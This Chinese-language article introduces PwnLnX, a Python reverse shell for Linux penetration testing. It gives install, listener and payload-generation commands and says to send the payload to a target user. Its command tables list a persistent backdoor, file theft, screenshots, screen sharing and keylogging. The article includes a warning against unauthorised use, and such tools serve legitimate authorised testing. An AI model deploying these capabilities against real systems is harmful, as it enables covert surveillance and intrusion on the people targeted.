![](https://image.3001.net/images/20210429/1619694221_608a928d2f070c2302441.jpg!small)

## 关于PwnLnX

PwnLnX是一款功能强大的高级多线程、多客户端Python反向Shell，可以帮助广大研究人员对Linux操作系统进行渗透测试。

 **请广大用户合法合理使用这个反向Shell，请不要在未授权系统上使用该工具。**

## 工具要求

首先，我们需要在本地设备上安装并配置好Python3环境，然后安装下列模块：

> vidstream
>
> pyfiglet
>
> tqdm
>
> mss
>
> termcolor
>
> pyautogui
>
> pyinstaller
>
> pip3
>
> pynput

## 工具安装

使用下列命令下载PwnLnX源码：

    
    
    git clone https://github.com/spectertraww/PwnLnX.git
    
    cd PwnLnX

接下来，下载并安装相应的依赖组件：

    
    
    chmod +x setup.sh
    
    ./setup.sh

## PwnLnX运行

显示帮助信息：

    
    
    python3 PwnLnX.py --help

监听传入的连接：

    
    
    python3 PwnLnX.py --lhost [your localhost ip address] --lport [free port for listening incoming connections]

创建/生成Payload：

    
    
    chmod +x PwnGen.sh
    
    ./PwnGen.sh

按照操作步骤，我们就可以成功创建好Payload了，Payload存储在PwnLnX目录中，然后我们需要将创建好的Payload发送给目标用户。

## PwnLnX使用

 ** **命令****

|

 ** **使用****  
  
---|---  
  
help

|

显示帮助信息  
  
exit

|

关闭所有的会话并退出程序  
  
show sessions

|

显示所有可用的会话  
  
session [ID]

|

使用指定的会话ID进行交互  
  
kill [all/ID]

|

终止指定的会话或终止所有会话  
  
banner

|

修改程序Banner  
  
### 与会话进行交互

 ** **命令****

|

 ** **使用****  
  
---|---  
  
help

|

显示帮助信息  
  
quit

|

关闭当前会话  
  
background

|

当前会话后台运行  
  
sysinfo

|

获取目标操作系统信息  
  
create_persist

|

创建一个持久化后门  
  
upload

|

上传指定文件至目标系统  
  
download

|

从目标系统下载指定文件  
  
screenshot

|

获取目标系统桌面截图  
  
start_screenshare

|

开始桌面共享  
  
stop_screenshare

|

关闭桌面共享  
  
start_keycap

|

开始捕捉目标用户键盘记录  
  
dump_keycap

|

导出/获取捕捉到的键盘记录  
  
stop_keycap

|

停止键盘记录  
  
注意：除了上表中列出的命令之外，我们还可以执行各种Linux系统命令。

## 工具运行截图

![](https://image.3001.net/images/20210429/1619694284_608a92cc3fc68497beed4.png!small)

![](https://image.3001.net/images/20210429/1619694293_608a92d5a2b452a54289e.png!small)

![](https://image.3001.net/images/20210429/1619694302_608a92de07732aff395ed.png!small)

![](https://image.3001.net/images/20210429/1619694309_608a92e583e27da54d354.png!small)

![](https://image.3001.net/images/20210429/1619694317_608a92ed20c117101a909.png!small)

![](https://image.3001.net/images/20210429/1619694325_608a92f5825cd9bc00e50.png!small)

![](https://image.3001.net/images/20210429/1619694333_608a92fd4b2bfd900ec54.png!small)

![](https://image.3001.net/images/20210429/1619694340_608a9304640207d1cdcfb.png!small)

![](https://image.3001.net/images/20210429/1619694347_608a930b1edc55207a67e.png!small)

## 项目地址

 **PwnLnX：** https://github.com/spectertraww/PwnLnX

